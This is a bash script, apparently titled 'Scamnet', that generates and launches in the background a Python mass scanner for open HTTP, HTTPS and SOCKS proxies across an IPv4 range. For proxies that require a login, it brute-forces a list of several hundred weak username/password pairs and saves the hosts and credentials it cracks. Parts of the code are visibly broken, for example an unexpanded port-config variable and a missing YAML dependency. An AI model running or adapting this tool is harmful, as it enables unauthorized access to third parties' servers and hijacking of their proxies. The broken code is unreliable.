#!/bin/bash
# main.sh - Scamnet OTC 全协议异步扫描器（v5.0 - HTTP/HTTPS/SOCKS4/SOCKS5 + 异步极速）
set -e
RED='\033[31m'; GREEN='\033[32m'; YELLOW='\033[33m'; NC='\033[0m'
LOG_DIR="logs"; mkdir -p "$LOG_DIR"
LATEST_LOG="$LOG_DIR/latest.log"
echo -e "${GREEN}[OTC] Scamnet v5.0 (全协议 + 异步极速 + 自定义端口 + 自动后台)${NC}"
echo "日志 → $LATEST_LOG"

# ==================== 依赖安装 ====================
if [ ! -f ".deps_installed" ]; then
    echo -e "${YELLOW}[*] 安装依赖...${NC}"
    if ! command -v pip3 &>/dev/null; then
        if command -v apt >/dev/null; then apt update -qq && apt install -y python3-pip; fi
        if command -v yum >/dev/null; then yum install -y python3-pip; fi
        if command -v apk >/dev/null; then apk add py3-pip; fi
    fi
    pip3 install --user -i https://pypi.tuna.tsinghua.edu.cn/simple aiohttp tqdm asyncio
    touch .deps_installed
    echo -e "${GREEN}[+] 依赖安装完成${NC}"
else
    echo -e "${GREEN}[+] 依赖已安装${NC}"
fi

# ==================== 输入自定义 IP 范围 ====================
DEFAULT_START="157.254.32.0"
DEFAULT_END="157.254.52.255"
echo -e "${YELLOW}请输入起始 IP（默认: $DEFAULT_START）:${NC}"
read -r START_IP
START_IP=${START_IP:-$DEFAULT_START}
echo -e "${YELLOW}请输入结束 IP（默认: $DEFAULT_END）:${NC}"
read -r END_IP
END_IP=${END_IP:-$DEFAULT_END}

# 验证 IP
if ! [[ $START_IP =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$ ]] || ! [[ $END_IP =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$ ]]; then
    echo -e "${RED}[!] IP 格式错误！${NC}"
    exit 1
fi
if [ "$(printf '%s\n' "$START_IP" "$END_IP" | sort -V | head -n1)" != "$START_IP" ]; then
    echo -e "${RED}[!] 起始 IP 必须小于等于结束 IP！${NC}"
    exit 1
fi
echo -e "${GREEN}[*] 扫描范围: $START_IP - $END_IP${NC}"

# ==================== 输入自定义端口 ====================
echo -e "${YELLOW}请输入端口（默认: 1080）:${NC}"
echo " 支持格式：1080 / 1080 8080 / 1-65535"
read -r PORT_INPUT
PORT_INPUT=${PORT_INPUT:-1080}

# 解析端口
PORTS_CONFIG=""
if [[ $PORT_INPUT =~ ^[0-9]+-[0-9]+$ ]]; then
    PORTS_CONFIG="range: \"$PORT_INPUT\""
elif [[ $PORT_INPUT =~ ^[0-9]+( [0-9]+)*$ ]]; then
    PORT_LIST=$(echo "$PORT_INPUT" | tr ' ' ',' | sed 's/,/","/g')
    PORTS_CONFIG="ports: [\"$PORT_LIST\"]"
else
    PORTS_CONFIG="ports: [$PORT_INPUT]"
fi
echo -e "${GREEN}[*] 端口配置: $PORT_INPUT → $PORTS_CONFIG${NC}"

# ==================== 生成后台运行脚本 ====================
RUN_SCRIPT="$LOG_DIR/run_$(date +%Y%m%d_%H%M%S).sh"
cat > "$RUN_SCRIPT" << 'EOF'
#!/bin/bash
set -e
cd "$(dirname "$0")"

# 创建 config.yaml
cat > config.yaml << CONFIG
input_range: "${START_IP}-${END_IP}"
$PORTS_CONFIG
timeout: 5.0
max_concurrent: 15000
protocol_order: ["http", "https", "socks4", "socks5"]
CONFIG

# 全协议异步扫描器 scanner_full.py
cat > scanner_full.py << 'PY'
#!/usr/bin/env python3
import asyncio
import aiohttp
import ipaddress
import sys
import yaml
import base64
from tqdm.asyncio import tqdm_asyncio
import warnings
warnings.filterwarnings("ignore", category=DeprecationWarning)

# ==================== 加载配置 ====================
with open('config.yaml') as f:
    cfg = yaml.safe_load(f)
INPUT_RANGE = cfg['input_range']
RAW_PORTS = cfg.get('ports', cfg.get('range'))
TIMEOUT = cfg.get('timeout', 5.0)
MAX_CONCURRENT = cfg.get('max_concurrent', 15000)
PROTOCOL_ORDER = cfg.get('protocol_order', ["http", "https", "socks4", "socks5"])

# ==================== 解析 IP/端口 ====================
def parse_ip_range(s):
    if '/' in s:
        return [str(ip) for ip in ipaddress.ip_network(s, strict=False).hosts()]
    start, end = s.split('-')
    s, e = int(ipaddress.IPv4Address(start)), int(ipaddress.IPv4Address(end))
    return [str(ipaddress.IPv4Address(i)) for i in range(s, e + 1)]

def parse_ports(p):
    if isinstance(p, str) and '-' in p:
        a, b = map(int, p.split('-'))
        return list(range(a, b + 1))
    if isinstance(p, list):
        return [int(x) for x in p]
    return [int(p)]

ips = parse_ip_range(INPUT_RANGE)
ports = parse_ports(RAW_PORTS)
print(f"[*] IP: {len(ips):,}, 端口: {len(ports)}, 总任务: {len(ips)*len(ports):,}")
print(f"[*] 协议顺序: {PROTOCOL_ORDER}")

# ==================== 全局 ====================
valid_count = 0
detail_lock = asyncio.Lock()
valid_lock = asyncio.Lock()
country_cache = {}
semaphore = asyncio.Semaphore(MAX_CONCURRENT)

WEAK_PASSWORDS = [
    # === 原始列表 ===
    ("123","123"),("admin","admin"),("root","root"),("user","user"),("proxy","proxy"),("111","111"),("1","1"),("qwe123","qwe123"),
    ("abc","abc"),("aaa","aaa"),("1234","1234"),("socks5","socks5"),("123456","123456"),("12345678","12345678"),("admin123","admin"),
    ("admin","123456"),("12345","12345"),("test","test"),("guest","guest"),("admin",""),("888888","888888"),("test123","test123"),
    ("qwe","qwe"),("11","11"),("222","222"),("2","2"),("3","3"),("12349","12349"),("user","123"),("user","1234"),("user","12345"),
    ("user","123456"),("socks","socks"),("username","username"),("user","pass"),("user","pwd"),("user","password"),("password","password"),
    ("demo","demo"),("fuckyou","fuckyou"),("1239","1239"),("123459","123459"),("1080","1080"),("123","321"),("123","456"),("321","321"),
    ("1234","4321"),("1234","5678"),("12345","54321"),("12345","678910"),("12345","67890"),("123456","654321"),("123456789","123456789"),
    ("123456789","987654321"),("hello","hello"),("abcdefg","abcdefg"),("520","520"),("520","1314"),("s5","s5"),("a","a"),("a","b"),
    ("ab","ab"),("ab","cd"),("aa","bb"),("aa","bb"),("aaa","aaa"),("aaa","bbb"),("aaa","123"),("a123","a123"),("aa123","aa123"),("aaa123","aaa123"),
    ("aa123456","aa123456"),("123aa","123aa"),("123aaa","123aaa"),("123abc","123abc"),("aa","bb"),("aa","bb"),("aa","bb"),("aa","bb"),

    # === 你额外提供的字典（已去重）===
    ("admin","admin"),("12349","12349"),("socks5","socks5"),("socks","socks"),("guest","guest"),("root","root"),
    ("user","user"),("username","username"),("user","pass"),("user","pwd"),("user","password"),("password","password"),
    ("demo","demo"),("test","test"),("fuckyou","fuckyou"),("1239","1239"),("123459","123459"),("1080","1080"),
    ("123","123"),("123","321"),("123","456"),("321","321"),("1234","1234"),("1234","4321"),("1234","5678"),
    ("12345","12345"),("12345","54321"),("12345","678910"),("12345","67890"),("123456","123456"),("123456","654321"),
    ("12345678","12345678"),("12345678","87654321"),("123456789","123456789"),("123456789","987654321"),
    ("hello","hello"),("abcdefg","abcdefg"),("520","520"),("520","1314"),("s5","s5"),("a","a"),("a","b"),
    ("ab","cd"),("aa","bb"),("aaa","bbb"),("aaa","123"),("aaa","aaa"),("a123","a123"),("aa123","aa123"),
    ("aaa123","aaa123"),("aa123456","a123456"),("123aa","123aa"),("123aaa","123aaa"),("123abc","123abc"),
    ("qwq","qwq"),("qaq","qaq"),("qaq","qwq"),("qwq","qaq"),("111","aaa"),("111","222"),("aaa","111"),
    ("123456aa","123456aa"),("abc123","abc123"),("abc","123"),("123","abc"),("1234","abcd"),("12345","abcde"),
    ("123456","abcdef"),("123","qwe"),("1234","qwer"),("12345","qwert"),("123456","qwerty"),("abcde","abcde"),
    ("abc","abc"),("abc","cba"),("abc","def"),("b","b"),("asd","asd"),("as","df"),("asd","fgh"),
    ("qaq","qaq"),("qwq","qwe"),("qwe","123"),("qwer","qwer"),("qwer","1234"),("qwert","qwert"),
    ("qwert","12345"),("qwerty","qwerty"),("qwerty","123456"),("123456","qwert"),("123123","123123"),
    ("123123","abcabc"),("abcabc","123"),("love","love"),("awsl","awsl"),("nmsl","nmsl"),("cnmb","cnmb"),
    ("wsnd","wsnd"),("69","69"),("6969","6969"),("696969","696969"),("qwe","asd"),("qweasd","qweasd"),
    ("0","0"),("00","00"),("000","000"),("0000","0000"),("00000","00000"),("000000","000000"),
    ("1","1"),("a123456","a123456"),("admin","123456"),("11","11"),("111","111"),("1111","1111"),
    ("11111","11111"),("111111","111111"),("2","2"),("22","22"),("222","222"),("2222","2222"),
    ("22222","22222"),("222222","222222"),("3","3"),("33","33"),("333","333"),("3333","3333"),
    ("33333","33333"),("333333","333333"),("4","4"),("44","44"),("444","444"),("4444","4444"),
    ("44444","44444"),("444444","444444"),("5","5"),("55","55"),("555","555"),("5555","5555"),
    ("55555","55555"),("555555","555555"),("6","6"),("66","66"),("666","666"),("6666","6666"),
    ("66666","66666"),("666666","666666"),("7","7"),("77","77"),("777","777"),("7777","7777"),
    ("77777","77777"),("777777","777777"),("8","8"),("88","88"),("888","888"),("8888","8888"),
    ("88888","88888"),("888888","888888"),("9","9"),("99","99"),("999","999"),("9999","9999"),
    ("99999","99999"),("999999","999999"),
    # 重复字母/数字序列
    ("a","a"),("aa","aa"),("aaa","aaa"),("aaaa","aaaa"),("aaaaa","aaaaa"),("aaaaaa","aaaaaa"),
    ("b","b"),("bb","bb"),("bbb","bbb"),("bbbb","bbbb"),("bbbbb","bbbbb"),("bbbbbb","bbbbbb"),
    ("c","c"),("cc","cc"),("ccc","ccc"),("cccc","cccc"),("ccccc","ccccc"),("cccccc","cccccc"),
    ("d","d"),("dd","dd"),("ddd","ddd"),("dddd","dddd"),("ddddd","ddddd"),("dddddd","dddddd"),
    ("e","e"),("ee","ee"),("eee","eee"),("eeee","eeee"),("eeeee","eeeee"),("eeeeee","eeeeee"),
    ("f","f"),("ff","ff"),("fff","fff"),("ffff","ffff"),("fffff","fffff"),("ffffff","ffffff"),
    ("g","g"),("gg","gg"),("ggg","ggg"),("gggg","gggg"),("ggggg","ggggg"),("gggggg","gggggg"),
    ("h","h"),("hh","hh"),("hhh","hhh"),("hhhh","hhhh"),("hhhhh","hhhhh"),("hhhhhh","hhhhhh"),
    ("i","i"),("ii","ii"),("iii","iii"),("iiii","iiii"),("iiiii","iiiii"),("iiiiii","iiiiii"),
    ("j","j"),("jj","jj"),("jjj","jjj"),("jjjj","jjjj"),("jjjjj","jjjjj"),("jjjjjj","jjjjjj"),
    ("k","k"),("kk","kk"),("kkk","kkk"),("kkkk","kkkk"),("kkkkk","kkkkk"),("kkkkkk","kkkkkk"),
    ("l","l"),("ll","ll"),("lll","lll"),("llll","llll"),("lllll","lllll"),("llllll","llllll"),
    ("m","m"),("mm","mm"),("mmm","mmm"),("mmmm","mmmm"),("mmmmm","mmmmm"),("mmmmmm","mmmmmm"),
    ("n","n"),("nn","nn"),("nnn","nnn"),("nnnn","nnnn"),("nnnnn","nnnnn"),("nnnnnn","nnnnnn"),
    ("o","o"),("oo","oo"),("ooo","ooo"),("oooo","oooo"),("ooooo","ooooo"),("oooooo","oooooo"),
    ("p","p"),("pp","pp"),("ppp","ppp"),("pppp","pppp"),("ppppp","ppppp"),("pppppp","pppppp"),
    ("q","q"),("qq","qq"),("qqq","qqq"),("qqqq","qqqq"),("qqqqq","qqqqq"),("qqqqqq","qqqqqq"),
    ("r","r"),("rr","rr"),("rrr","rrr"),("rrrr","rrrr"),("rrrrr","rrrrr"),("rrrrrr","rrrrrr"),
    ("s","s"),("ss","ss"),("sss","sss"),("ssss","ssss"),("sssss","sssss"),("ssssss","ssssss"),
    ("t","t"),("tt","tt"),("ttt","ttt"),("tttt","tttt"),("ttttt","ttttt"),("tttttt","tttttt"),
    ("u","u"),("uu","uu"),("uuu","uuu"),("uuuu","uuuu"),("uuuuu","uuuuu"),("uuuuuu","uuuuuu"),
    ("v","v"),("vv","vv"),("vvv","vvv"),("vvvv","vvvv"),("vvvvv","vvvvv"),("vvvvvv","vvvvvv"),
    ("w","w"),("ww","ww"),("www","www"),("wwww","wwww"),("wwwww","wwwww"),("wwwwww","wwwwww"),
    ("x","x"),("xx","xx"),("xxx","xxx"),("xxxx","xxxx"),("xxxxx","xxxxx"),("xxxxxx","xxxxxx"),
    ("y","y"),("yy","yy"),("yyy","yyy"),("yyyy","yyyy"),("yyyyy","yyyyy"),("yyyyyy","yyyyyy"),
    ("z","z"),("zz","zz"),("zzz","zzz"),("zzzz","zzzz"),("zzzzz","zzzzz"),("zzzzzz","zzzzzz")
]

# ==================== 国家查询 ====================
async def get_country(ip, session):
    if ip in country_cache: return country_cache[ip]
    for url in [
        f"http://ip-api.com/json/{ip}?fields=countryCode",
        f"https://ipinfo.io/{ip}/country"
    ]:
        try:
            async with session.get(url, timeout=5) as r:
                if r.status == 200:
                    if "json" in url:
                        data = await r.json()
                        code = data.get("countryCode", "").strip().upper()
                    else:
                        code = (await r.text()).strip().upper()
                    if len(code) == 2 and code.isalpha():
                        country_cache[ip] = code
                        return code
        except: pass
    country_cache[ip] = "XX"
    return "XX"

# ==================== 协议测试函数 ====================
async def test_http(ip, port, session, auth=None):
    headers = {}
    if auth:
        headers["Proxy-Authorization"] = "Basic " + base64.b64encode(f"{auth[0]}:{auth[1]}".encode()).decode()
    try:
        async with session.request("CONNECT", "http://ifconfig.me:80", proxy=f"http://{ip}:{port}", headers=headers, timeout=aiohttp.ClientTimeout(total=TIMEOUT)) as r:
            if r.status != 200: return False, 0, None
        async with session.get("http://ifconfig.me/", proxy=f"http://{ip}:{port}", headers={"Host": "ifconfig.me"}) as r:
            export_ip = (await r.text()).strip()
            latency = round(r.extra.get("time_total", 0) * 1000)
            return True, latency, export_ip
    except: return False, 0, None

async def test_https(ip, port, session, auth=None):
    return await test_http(ip, port, session, auth)

async def test_socks4(ip, port, session):
    try:
        async with session.get("http://ifconfig.me/", proxy=f"socks4://{ip}:{port}", timeout=aiohttp.ClientTimeout(total=TIMEOUT)) as r:
            export_ip = (await r.text()).strip()
            latency = round(r.extra.get("time_total", 0) * 1000)
            return True, latency, export_ip
    except: return False, 0, None

async def test_socks5(ip, port, session, auth=None):
    proxy_auth = aiohttp.BasicAuth(*auth) if auth else None
    try:
        async with session.get("http://ifconfig.me/", proxy=f"socks5h://{ip}:{port}", proxy_auth=proxy_auth, timeout=aiohttp.ClientTimeout(total=TIMEOUT)) as r:
            export_ip = (await r.text()).strip()
            latency = round(r.extra.get("time_total", 0) * 1000)
            return True, latency, export_ip
    except: return False, 0, None

# ==================== 弱密码爆破 ====================
async def brute_weak(ip, port, protocol, session):
    tasks = []
    for u, p in WEAK_PASSWORDS:
        if protocol in ("http", "https"):
            tasks.append(test_http(ip, port, session, (u, p)))
        elif protocol == "socks5":
            tasks.append(test_socks5(ip, port, session, (u, p)))
    results = await asyncio.gather(*tasks, return_exceptions=True)
    for (u,p), res in zip(WEAK_PASSWORDS, results):
        if isinstance(res, tuple) and res[0]:
            return (u,p), res[1], res[2]
    return None, 0, None

# ==================== 主扫描函数 ====================
async def scan(ip, port, session):
    async with semaphore:
        result = {"ip":ip, "port":port, "scheme":"", "status":"FAIL", "country":"XX", "latency":"-", "export_ip":"-", "auth":""}
        found = False

        for scheme in PROTOCOL_ORDER:
            if found: break
            ok, lat, exp = False, 0, None
            auth_pair = None

            if scheme == "http":
                ok, lat, exp = await test_http(ip, port, session)
            elif scheme == "https":
                ok, lat, exp = await test_https(ip, port, session)
            elif scheme == "socks4":
                ok, lat, exp = await test_socks4(ip, port, session)
            elif scheme == "socks5":
                ok, lat, exp = await test_socks5(ip, port, session)

            if not ok and scheme in ("http", "https", "socks5"):
                weak = await brute_weak(ip, port, scheme, session)
                if weak:
                    auth_pair, lat, exp = weak
                    ok = True

            if ok:
                country = await get_country(exp, session) if exp and exp not in ("Unknown","ParseError") else "XX"
                if country == "XX": country = await get_country(ip, session)
                auth_str = f"{auth_pair[0]}:{auth_pair[1]}" if auth_pair else ""
                result.update({
                    "scheme": scheme,
                    "status": "OK (Weak)" if auth_pair else "OK",
                    "country": country,
                    "latency": f"{lat}ms",
                    "export_ip": exp or "Unknown",
                    "auth": auth_str
                })
                found = True

        # 写文件
        line = f"{ip}:{port} | {result['scheme'] or '-'} | {result['status']} | {result['country']} | {result['latency']} | {result['export_ip']} | {result['auth']}"
        async with detail_lock:
            with open("result_detail.txt", "a", encoding="utf-8") as f:
                f.write(line + "\n")

        if result['status'].startswith("OK"):
            global valid_count
            valid_count += 1
            fmt = f"{result['scheme']}://{result['auth']}@{ip}:{port}#{result['country']}".replace("@:", ":")
            async with valid_lock:
                with open("proxy_valid.txt", "a", encoding="utf-8") as f:
                    f.write(fmt + "\n")
            print(f"[+] 发现 #{valid_count}: {fmt}")

# ==================== 主函数 ====================
async def main():
    with open("result_detail.txt", "w", encoding="utf-8") as f: f.write("# 全协议扫描详细日志\n")
    with open("proxy_valid.txt", "w", encoding="utf-8") as f: f.write("# scheme://[user:pass@]ip:port#CC\n")

    connector = aiohttp.TCPConnector(limit=MAX_CONCURRENT, limit_per_host=10, ssl=False)
    timeout = aiohttp.ClientTimeout(total=TIMEOUT)
    async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
        tasks = [scan(ip, port, session) for ip in ips for port in ports]
        for f in tqdm_asyncio.as_completed(tasks, total=len(tasks), desc="扫描进度", unit="port", ncols=100):
            await f
    print(f"\n[+] 完成！发现 {valid_count} 个可用代理 → proxy_valid.txt")

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print(f"\n[!] 中断！已保存 {valid_count} 个")
PY
chmod +x scanner_full.py

# 初始化结果文件
echo "# Scamnet 全协议日志 $(date)" > result_detail.txt
echo "# scheme://..." > proxy_valid.txt

# 启动
echo "[OTC] 全协议异步扫描启动..."
python3 scanner_full.py 2>&1 | tee "$LATEST_LOG"
VALID=$(grep -c "^http\|^https\|^socks" proxy_valid.txt || echo 0)
echo -e "\n${GREEN}[+] 完成！发现 ${VALID} 个代理${NC}"
EOF

# 替换变量
sed -i "s|\${START_IP}|$START_IP|g; s|\${END_IP}|$END_IP|g" "$RUN_SCRIPT"
chmod +x "$RUN_SCRIPT"

# ==================== 启动后台任务 ====================
echo -e "${GREEN}[*] 启动后台扫描（关闭窗口不会中断）...${NC}"
echo " 查看进度: tail -f $LATEST_LOG"
echo " 停止扫描: pkill -f scanner_full.py"
nohup "$RUN_SCRIPT" > /dev/null 2>&1 &
echo -e "${GREEN}[+] 已启动！PID: $!${NC}"
echo " 日志实时更新: tail -f $LATEST_LOG"
